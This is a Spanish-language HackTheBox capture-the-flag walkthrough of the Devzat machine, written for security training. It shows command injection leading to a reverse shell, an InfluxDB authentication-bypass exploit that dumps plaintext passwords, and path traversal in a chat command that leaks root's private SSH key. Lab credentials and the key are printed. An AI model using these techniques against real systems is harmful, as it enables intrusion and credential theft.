---
title: HTB - Devzat
published: true
categories: [Linux]
tags: [eJPT, eWPT, Media]
---


<img src="/assets/HTB/Devzat/devzat.png">


¡Hola!
Vamos a resolver de la máquina `Devzat` de dificultad "Media" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Fuzzing Directory .git (GIT Project Recomposition)**
- **Web Injection (RCE)**
- **Abusing InfluxDB (CVE-2019-20933)**
- **Abusing Devzat Chat /file command (Privilege Escalation)**
- **EXTRA (Crypto CTF Challenge - N Factorization)**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Devzat`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.11.118
PING 10.10.11.118 (10.10.11.118) 56(84) bytes of data.
64 bytes from 10.10.11.118: icmp_seq=1 ttl=63 time=38.3 ms

--- 10.10.11.118 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.118 -oG allPorts

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,80,8000 10.10.11.118 -oN targeted

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: devzat - where the devs at
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=12/16%Time=639C32D2%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Observamos dominio `devzat.htb`. Lo agregamos a nuestro `/etc/hosts`

### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```ruby
❯ whatweb http://devzat.htb
http://devzat.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[patrick@devzat.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.118], JQuery, Script, Title[devzat - where the devs at]
```

Accedemos al servicio HTTP por el puerto 80

<img src="/assets/HTB/Devzat/web.png">

No hay mucha funcionalidad en la web pero si hacemos scroll vemos que hace mención a un servicio de chat en el puerto 8000

<img src="/assets/HTB/Devzat/ssh.png">

Accedemos al servicio según comando aportado. Nos econtramos ante un chat

```bash
❯ ssh -l yorch devzat.htb -p 8000
                                                                                                                                                                      10 minutes earlier
devbot: You seem to be new here yorch. Welcome to Devzat! Run /help to see what you can do. 
devbot: yorch has joined the chat 
yorch: hello
yorch: help
devbot: Run /help to get help!
yorch: users
                                                                                                                                                                       8 minutes earlier
yorch: clear
                                                                                                                                                                       6 minutes earlier
yorch: exit
devbot: yorch has left the chat 
devbot: yorch stayed on for 4 minutes 
Welcome to the chat. There are no more users
devbot: yorch has joined the chat
```

Con el comando `/help` nos muestra el panel de ayuda

```bash
yorch: /help
[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
[SYSTEM] Because there s SSH apps on all platforms, even on mobile, you can join from anywhere.
[SYSTEM] 
[SYSTEM] Interesting features:
[SYSTEM] • Many, many commands. Run /commands.
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
[SYSTEM] • Emoji replacements! (like on Slack and Discord)
[SYSTEM] 
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
[SYSTEM] 
[SYSTEM] Made by Ishan Goel with feature ideas from friends.
[SYSTEM] Thanks to Caleb Denio for lending his server!
[SYSTEM] 
[SYSTEM] For a list of commands run
[SYSTEM] ┃ /commands
```

Con `/commands` listamos comandos disponibles

```bash
yorch: /help
[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
[SYSTEM] Because there s SSH apps on all platforms, even on mobile, you can join from anywhere.
[SYSTEM] 
[SYSTEM] Interesting features:
[SYSTEM] • Many, many commands. Run /commands.
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
[SYSTEM] • Emoji replacements! (like on Slack and Discord)
[SYSTEM] 
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
[SYSTEM] 
[SYSTEM] Made by Ishan Goel with feature ideas from friends.
[SYSTEM] Thanks to Caleb Denio for lending his server!
[SYSTEM] 
[SYSTEM] For a list of commands run
[SYSTEM] ┃ /commands
```

```bash
yorch: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
```

Seguimos enumerando pero no conseguimos más información. Seguimos enumerando subdominios

```bash
❯ wfuzz -c --hw=26 --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://devzat.htb' -H "Host: FUZZ.devzat.htb"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devzat.htb/
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000001744:   200        20 L     35 W       510 Ch      "pets" 
```

Localizamos un dominio `pets.devzat.htb`. Agregamos a nuestro `/etc/hosts`

Inspeccionamos la web y vemos que se trata de un inventario de mascotas en donde tenemos la capacidad de agregar nuevas mascotas

<img src="/assets/HTB/Devzat/pets.png">

Si tratamos de inyectar según qué caracteres observamos en la respuesta el retorno de un `exit status 1` lo que nos lleva a pensar que se está ejecutando algún comando

<img src="/assets/HTB/Devzat/status.png">

Procedemos interceptando la petición con BurpSuite

La respuesta de estado se acontece en el campo `species`. Inyectamos un ping en este campo y nos ponemos en escucha de trazas ICMP con `tcpdump`. Comprobamos que tenemos capacidad de RCE

<img src="/assets/HTB/Devzat/burp.png">

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:15:56.507634 IP 10.10.11.118 > 10.10.14.34: ICMP echo request, id 1, seq 1, length 64
11:15:56.507661 IP 10.10.14.34 > 10.10.11.118: ICMP echo reply, id 1, seq 1, length 64
```
Esta vez inyectamos un curl hacia nuestra dirección IP, creamos `index.html` con oneliner de bash, lo servimos mediante un servidor http y nos ponemos en escucha en el puerto 443. Ganamos acceso a la máquina víctima con el usuario `patrick`

<img src="/assets/HTB/Devzat/burprev.png">
<img src="/assets/HTB/Devzat/revshell.png">


### Movimiento Lateral

* * *

Listamos puertos internos abiertos. Vemos puertos que inicialmente no estabn disponibles de manera externa

```bash
patrick@devzat:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN     
tcp        0    138 10.10.11.118:59488     10.10.14.34:443         ESTABLISHED
tcp        0      1 10.10.11.118:51476     1.1.1.1:53              SYN_SENT   
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::8000                 :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN  
```

Mediante la herramienta `chisel` aplicamos Port Forwarding para enumerar el contenido de esos puertos de manera local en nuestro equipo

<img src="/assets/HTB/Devzat/chisel.png">

Procedemos a escanear los puertos con `nmap`

```bash
❯ nmap -sCV -p8086,8443,5000 127.0.0.1

PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: My genious go pet server
|     Date: Fri, 16 Dec 2022 10:54:26 GMT
|     Content-Length: 510
|     Content-Type: text/html; charset=utf-8
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset='utf-8'>
|     <meta name='viewport' content='width=device-width,initial-scale=1'>
|     <title>Pet Inventory</title>
|     <link rel='icon' type='image/png' href='/favicon.ico'>
|     <link rel='stylesheet' href='/css/global.css'>
|     <link rel='stylesheet' href='/css/bootstrap.min.css'>
|     <link rel='stylesheet' href='/css/all.min.css'>
|     <link rel='stylesheet' href='/build/bundle.css'>
|     <script type="module" src='/build/main.js'></script>
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: My genious go pet server
|     Date: Fri, 16 Dec 2022 10:54:41 GMT
|     Content-Length: 510
|     Content-Type: text/html; charset=utf-8
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset='utf-8'>
|     <meta name='viewport' content='width=device-width,initial-scale=1'>
|     <title>Pet Inventory</title>
|     <link rel='icon' type='image/png' href='/favicon.ico'>
|     <link rel='stylesheet' href='/css/global.css'>
|     <link rel='stylesheet' href='/css/bootstrap.min.css'>
|     <link rel='stylesheet' href='/css/all.min.css'>
|     <link rel='stylesheet' href='/build/bundle.css'>
|     <script type="module" src='/build/main.js'></script>
|     </head>
|     <body>
|     </body>
|_    </html>
8086/tcp open  http    InfluxDB http admin 1.7.5
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8443/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|_  256 66:61:73:b4:a2:9c:b1:b7:a9:81:7a:6e:1d:5d:fc:ec (ED25519)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
```
En el puerto 8086 vemos un servicio `InfluxDB`. InfluxDB es un sistema de gestión de bases de datos desarrollado por la empresa InfluxData, Inc. Buscamos vulnerabilidades asociadas a este servicio y encontramos este repositorio de [LorenzoTullini](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933). Nos lo descargamos a nuestro directorio de trabajo y lo ejecutamos

```bash
❯ python3 exploit.py

  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  
 - using CVE-2019-20933

Host (default: localhost): 
Port (default: 8086): 
Username <OR> path to username file (default: users.txt): 

Bruteforcing usernames ...
[v] admin

Host vulnerable !!!

Databases:

1) devzat
2) _internal

.quit to exit
[admin@127.0.0.1] Database: 
```

Seleccionamos la base de datos 1 y tratando de inyectar un comando vemos que las instrucciones disponibles son queries. Enumerando localizamos la tabla `users` y listando su contenido conseguimos unas credenciales

```bash
[admin@127.0.0.1] Database: 1

Starting InfluxDB shell - .back to go back
[admin@127.0.0.1/devzat] $ whoami
{
    "error": "error parsing query: found whoami, expected SELECT, DELETE, SHOW, CREATE, DROP, EXPLAIN, GRANT, REVOKE, ALTER, SET, KILL at line 1, char 1"
}
[admin@127.0.0.1/devzat] $ SHOW
{
    "error": "error parsing query: found DATABSES, expected CONTINUOUS, DATABASES, DIAGNOSTICS, FIELD, GRANTS, MEASUREMENT, MEASUREMENTS, QUERIES, RETENTION, SERIES, SHARD, SHARDS, STATS, SUBSCRIPTIONS, TAG, USERS at line 1, char 6"
}
[admin@127.0.0.1/devzat] $ SHOW FIELD
{
    "error": "error parsing query: found EOF, expected KEY, KEYS at line 1, char 12"
}
[admin@127.0.0.1/devzat] $ SHOW MEASUREMENTS 
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "user"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
[admin@127.0.0.1/devzat] $ SELECT * FROM "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

Recordemos que cuando ganamos acceso al sistema había dos usuarios, el nuestro `patrick` y `catherine`.Migramos al usuario catherine con la credencial encontrada. La flag de usuario la encontramos en la carpeta personal del usuario `catherine`

```bash
patrick@devzat:/tmp/chisel$ su catherine
Password: 
catherine@devzat:/tmp/chisel$ cd 
catherine@devzat:~$ ls
user.txt
catherine@devzat:~$ cat user.txt 
c857d1cfa82e2804c***************
```

### Escalada Privilegios

* * *

Volviendo al escaneo de puertos internos realizado anteriormente vemos que en el puerto 8443 tenemos un servicio open ssh. Nos conectamos de manera local y vemos que se trata el chat que visitamos con anterioridad. Listando comandos nos percatamos de que hay un comando `file` que antes no vimos. Esto nos hace pensar que estamos ante la versión en desarrollo del chat en cuestión. Si lo ejecutamos nos pide que aportemos una contraseña

```bash
catherine@devzat:~$ ssh -l yorch localhost -p 8443
The authenticity of host '[localhost]:8443 ([127.0.0.1]:8443)' can t be established.
ED25519 key fingerprint is SHA256:liAkhV56PrAa5ORjJC5MU4YSl8kfNXp+QuljetKw0XU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:8443' (ED25519) to the list of known hosts.
Welcome to the chat. There are no more users
devbot: yorch has joined the chat
yorch: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
[SYSTEM] file - Paste a files content directly to chat [alpha]
                                                                                                                                                                            3 minutes in
yorch: /file
[SYSTEM] Please provide file to print and the password
```

Listamos archivos propietarios del usuario `catherine`

```bash
catherine@devzat:/$ find \-type f -user catherine 2>/dev/null | grep -vE "cgroup|proc"
./home/catherine/.profile
./home/catherine/.cache/motd.legal-displayed
./home/catherine/.bashrc
./home/catherine/.ssh/known_hosts
./home/catherine/user.txt
./home/catherine/.bash_logout
./var/backups/devzat-main.zip
./var/backups/devzat-dev.zip
```

Nos llama la atención `devzat-dev.zip`. Lo movemos a la carpeta `/tmp` y descomprimimos para observar su contenido. Enumerando archivos localizamos una credencial en `commands.go`

```bash
func fileCommand(u *user, args []string) {
        .
        .
        .
        // Check my secure password
        if pass != "CeilingCatStillAThingIn2021?" {
                u.system("You did provide the wrong password")
                return
        }
        .
        .
        .
```

Nos volvemos a conectar al chat en el puerto 8443 y listamos `/etc/passwd` con la contraseña encontrada

```bash
yorch: /file /etc/passwd CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/etc/passwd does not exist!
yorch: /file ../../etc/passwd CeilingCatStillAThingIn2021?
[SYSTEM] root❌ 0:0:root:/root:/bin/bash
[SYSTEM] daemon❌ 1:1:daemon:/usr/sbin:/usr/sbin/nologin
[SYSTEM] bin❌ 2:2:bin:/bin:/usr/sbin/nologin
[SYSTEM] sys❌ 3:3:sys:/dev:/usr/sbin/nologin
[SYSTEM] sync❌ 4:65534:sync:/bin:/bin/sync
[SYSTEM] games❌ 5:60:games:/usr/games:/usr/sbin/nologin
[SYSTEM] man❌ 6:12:man:/var/cache/man:/usr/sbin/nologin
[SYSTEM] lp❌ 7:7:lp:/var/spool/lpd:/usr/sbin/nologin
[SYSTEM] mail❌ 8:8:mail:/var/mail:/usr/sbin/nologin
[SYSTEM] news❌ 9:9:news:/var/spool/news:/usr/sbin/nologin
[SYSTEM] uucp❌ 10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
[SYSTEM] proxy❌ 13:13:proxy:/bin:/usr/sbin/nologin
[SYSTEM] www-data❌ 33:33:www-data:/var/www:/usr/sbin/nologin
[SYSTEM] backup❌ 34:34:backup:/var/backups:/usr/sbin/nologin
[SYSTEM] list❌ 38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
[SYSTEM] irc❌ 39:39:ircd:/var/run/ircd:/usr/sbin/nologin
[SYSTEM] gnats❌ 41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
[SYSTEM] nobody❌ 65534:65534:nobody:/nonexistent:/usr/sbin/nologin
[SYSTEM] systemd-network❌ 100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
[SYSTEM] systemd-resolve❌ 101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
[SYSTEM] systemd-timesync❌ 102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
[SYSTEM] messagebus❌ 103:106::/nonexistent:/usr/sbin/nologin
[SYSTEM] syslog❌ 104:110::/home/syslog:/usr/sbin/nologin
[SYSTEM] _apt❌ 105:65534::/nonexistent:/usr/sbin/nologin
[SYSTEM] tss❌ 106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
[SYSTEM] uuidd❌ 107:112::/run/uuidd:/usr/sbin/nologin
[SYSTEM] tcpdump❌ 108:113::/nonexistent:/usr/sbin/nologin
[SYSTEM] landscape❌ 109:115::/var/lib/landscape:/usr/sbin/nologin
[SYSTEM] pollinate❌ 110:1::/var/cache/pollinate:/bin/false
[SYSTEM] sshd❌ 111:65534::/run/sshd:/usr/sbin/nologin
[SYSTEM] systemd-coredump❌ 999:999:systemd Core Dumper:/:/usr/sbin/nologin
[SYSTEM] patrick❌ 1000:1000:patrick:/home/patrick:/bin/bash
[SYSTEM] catherine❌ 1001:1001:catherine,,,:/home/catherine:/bin/bash
[SYSTEM] usbmux❌ 112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

Probamos por si tenemos capacidad de listar archivos privilegiados y conseguimos listar la clave id_rsa de root

```bash
yorch: /file ../../root/.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----
```

La importamos a nuestro equipo. Aplicamos privilegios 600 y nos conectamos por ssh como root. La flag la encontramos en el directorio `/root`

```bash
❯ ssh -i id_rsa root@10.10.11.118
The authenticity of host '10.10.11.118 (10.10.11.118)' can t be established.
ECDSA key fingerprint is SHA256:0rsaIiCqLD9ELa+kVyYB1zoufcsvYtVR7QKaYzUyC0Q.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.118' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 16 Dec 2022 11:42:02 AM UTC

  System load:              0.02
  Usage of /:               56.4% of 7.81GB
  Memory usage:             38%
  Swap usage:               0%
  Processes:                248
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.118
  IPv6 address for eth0:    dead:beef::250:56ff:fe96:7d2b


107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jan 26 16:26:44 2022
root@devzat:~# cat /root/root.txt 
3face92db5b0adcff***************
```

Hemos completado la máquina **Devzat** de HackTheBox!! Happy Hacking!!

<img src="/assets/HTB/Devzat/pwned.png">